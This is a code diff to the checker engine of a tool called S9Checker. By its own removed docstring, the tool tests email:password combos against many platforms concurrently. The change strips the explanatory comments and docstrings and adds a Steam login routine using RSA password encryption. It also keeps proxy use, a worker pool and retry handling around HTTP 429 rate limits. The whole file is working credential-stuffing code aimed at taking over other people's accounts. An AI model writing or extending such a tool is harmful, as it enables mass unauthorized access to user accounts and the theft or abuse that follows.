@@ -1,8 +1,3 @@
-"""
-Async credential checker engine for S9Checker.
-Uses a worker pool pattern to test email:password combos against
-multiple platforms concurrently with rate limiting and retry logic.
-"""
 
 import asyncio
 import aiohttp
@@ -20,12 +15,12 @@ from core.platforms import Platform, PLATFORMS
 from core.results import ResultsManager, ResultStatus
 from core.session import SessionManager
 from core.classifier import classify_response
+from core import steam_auth
 
 logger = logging.getLogger("S9Checker")
 
 
 class CredentialChecker:
-    """Async multi-platform credential validator using a worker pool."""
 
     def __init__(self, results_mgr: ResultsManager,
                  progress_callback: Optional[Callable[[dict], Awaitable[None]]] = None,
@@ -45,16 +40,11 @@ class CredentialChecker:
         self._session_mgr = SessionManager()
 
     def stop(self):
-        """Signal all workers to stop."""
         self._stop_flag = True
 
-    # -------------------------------------------------------------------
-    # HTTP request helper
-    # -------------------------------------------------------------------
     async def _send_request(self, session: aiohttp.ClientSession,
                             platform: Platform, data: str,
                             headers: dict, proxy: Optional[str]) -> tuple:
-        """Send a single HTTP request and return (status, text, headers, location)."""
         timeout = aiohttp.ClientTimeout(total=platform.timeout or DEFAULT_TIMEOUT)
         async with session.request(
             platform.method,
@@ -68,17 +58,12 @@ class CredentialChecker:
             text = await resp.text()
             return resp.status, text, dict(resp.headers), dict(resp.headers).get("Location", "")
 
-    # -------------------------------------------------------------------
-    # Core credential check for one combo on one platform
-    # -------------------------------------------------------------------
     async def _check_platform(self, session: aiohttp.ClientSession,
                               email: str, password: str,
                               platform: Platform) -> tuple[str, str]:
-        """Test a single credential pair against a single platform."""
         if self._stop_flag:
             return ResultStatus.ERROR, "Stopped"
 
-        # Rate limiting
         now = time.time()
         if platform.name in self._rate_limiters:
             elapsed = now - self._rate_limiters[platform.name]
@@ -87,7 +72,6 @@ class CredentialChecker:
                 await asyncio.sleep(min_interval - elapsed)
         self._rate_limiters[platform.name] = time.time()
 
-        # Create semaphore if not yet created
         if platform.name not in self._semaphores:
             conc = (min(self._max_concurrent_override, platform.max_concurrent)
                     if self._max_concurrent_override else platform.max_concurrent)
@@ -96,43 +80,70 @@ class CredentialChecker:
         async with self._semaphores[platform.name]:
             try:
                 await self._session_mgr.get_session_cookies(session, platform)
-
-                # Build HTTP payload
-                payload = platform.build_payload(email, password)
-                headers = dict(platform.headers)
                 proxy = self.proxy or None
 
-                if platform.auth_type == "json":
-                    data = json.dumps(payload)
-                    headers["Content-Type"] = "application/json"
-                else:
+                if platform.auth_type == "steam":
+                    rsa_data = await steam_auth.get_rsa_key(session, email, proxy)
+                    if not rsa_data.get("publickey_mod"):
+                        return ResultStatus.ERROR, "Failed to get RSA key"
+                    encrypted_pw = steam_auth.encrypt_password(rsa_data, password)
+                    payload = steam_auth.build_steam_payload(
+                        email, encrypted_pw, rsa_data["timestamp"]
+                    )
                     data = urlencode(payload)
+                    headers = dict(platform.headers)
                     headers["Content-Type"] = "application/x-www-form-urlencoded"
 
-                # Retry loop with exponential backoff on HTTP 429
-                for attempt in range(MAX_RETRIES_429 + 1):
-                    if self._stop_flag:
-                        return ResultStatus.ERROR, "Stopped"
+                    for attempt in range(MAX_RETRIES_429 + 1):
+                        if self._stop_flag:
+                            return ResultStatus.ERROR, "Stopped"
+                        status, text, headers_resp, location = await self._send_request(
+                            session, platform, data, headers, proxy
+                        )
+                        if status == 429:
+                            retry_after = int(headers_resp.get("Retry-After", 5))
+                            if attempt < MAX_RETRIES_429:
+                                wait = retry_after * (RETRY_BACKOFF_BASE ** attempt)
+                                self._rate_limiters[platform.name] = time.time() + wait
+                                await asyncio.sleep(wait)
+                                continue
+                            return ResultStatus.RATE_LIMITED, f"HTTP 429 after {MAX_RETRIES_429} retries"
+                        break
 
-                    status, text, headers_resp, location = await self._send_request(
-                        session, platform, data, headers, proxy
-                    )
+                    return steam_auth.parse_steam_response(text)
+                else:
+                    payload = platform.build_payload(email, password)
+                    headers = dict(platform.headers)
 
-                    if status == 429:
-                        retry_after = int(headers_resp.get("Retry-After", 5))
-                        if attempt < MAX_RETRIES_429:
-                            wait = retry_after * (RETRY_BACKOFF_BASE ** attempt)
-                            logger.warning(f"[{platform.name}] 429 - retry in {wait}s "
-                                           f"(attempt {attempt + 1}/{MAX_RETRIES_429})")
-                            self._rate_limiters[platform.name] = time.time() + wait
-                            await asyncio.sleep(wait)
-                            continue
-                        return ResultStatus.RATE_LIMITED, f"HTTP 429 after {MAX_RETRIES_429} retries"
+                    if platform.auth_type == "json":
+                        data = json.dumps(payload)
+                        headers["Content-Type"] = "application/json"
+                    else:
+                        data = urlencode(payload)
+                        headers["Content-Type"] = "application/x-www-form-urlencoded"
 
-                    break
+                    for attempt in range(MAX_RETRIES_429 + 1):
+                        if self._stop_flag:
+                            return ResultStatus.ERROR, "Stopped"
 
-                # Classify the response
-                return classify_response(status, text, headers_resp, location, platform)
+                        status, text, headers_resp, location = await self._send_request(
+                            session, platform, data, headers, proxy
+                        )
+
+                        if status == 429:
+                            retry_after = int(headers_resp.get("Retry-After", 5))
+                            if attempt < MAX_RETRIES_429:
+                                wait = retry_after * (RETRY_BACKOFF_BASE ** attempt)
+                                logger.warning(f"[{platform.name}] 429 - retry in {wait}s "
+                                               f"(attempt {attempt + 1}/{MAX_RETRIES_429})")
+                                self._rate_limiters[platform.name] = time.time() + wait
+                                await asyncio.sleep(wait)
+                                continue
+                            return ResultStatus.RATE_LIMITED, f"HTTP 429 after {MAX_RETRIES_429} retries"
+
+                        break
+
+                    return classify_response(status, text, headers_resp, location, platform)
 
             except asyncio.TimeoutError:
                 if self.ignore_timeouts:
@@ -145,12 +156,8 @@ class CredentialChecker:
             except Exception as e:
                 return ResultStatus.ERROR, f"Unexpected: {str(e)[:50]}"
 
-    # -------------------------------------------------------------------
-    # Main test runner with worker pool
-    # -------------------------------------------------------------------
     async def run_test(self, combos: list, platforms: list,
                        progress_interval: float = PROGRESS_UPDATE_INTERVAL):
-        """Run credential testing across multiple platforms using a worker pool."""
         self._stop_flag = False
         total = len(combos) * len(platforms)
         completed = 0
@@ -216,7 +223,6 @@ class CredentialChecker:
             workers = [asyncio.create_task(_worker()) for _ in range(num_workers)]
             await asyncio.gather(*workers, return_exceptions=True)
 
-        # Final progress update
         if self.progress_cb:
             elapsed = time.time() - start_time
             speed = completed / elapsed if elapsed > 0 else 0
